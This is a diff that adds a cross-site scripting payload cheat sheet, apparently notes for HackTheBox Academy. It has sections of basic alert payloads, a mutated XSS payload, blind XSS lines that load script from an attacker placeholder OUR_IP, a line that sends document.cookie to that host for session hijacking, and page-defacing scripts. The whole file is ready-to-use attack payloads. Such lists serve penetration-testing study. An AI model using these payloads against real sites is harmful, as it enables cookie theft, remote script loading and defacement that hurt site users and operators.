@@ -1,0 +1,49 @@
+###### BASIC PAYLOADS ######
+<plaintext>
+<img src=x onerror=alert(4200)>
+<img src="" onerror=alert(document.cookie)>
+<img src="" onerror=alert(window.origin)>
+<img+src%3D'javascript%3Aalert(1)%3B'>
+<script>alert(window.origin)</script>
+<script>alert(document.cookie)</script>
+<script>print()</script>
+<img onload="console.log('JS läuft')">
+" onmouseover="alert(1)
+' onerror='alert(1)
+
+
+
+###### MUTATED XSS ######
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+
+
+###### BLIND XXS ATTACKS ######
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+
+
+
+###### SESSION HIJACKING ######
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
+
+
+###### DEFACING ######
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+<script>document.title = 'HackTheBox Academy'</script>
+<script>document.getElementById("todo").innerHTML = "New Text"</script>
+<script>document.getElementsByTagName('body')[0].innerHTML = "New Text"</script>
+<script>document.write()</script>
+<script>document.getElementById('urlform').remove()</script>
+<script>document.body.insertAdjacentHTML("beforeend", `<HTML_CODE>`);</script>
+
+
+
+
+
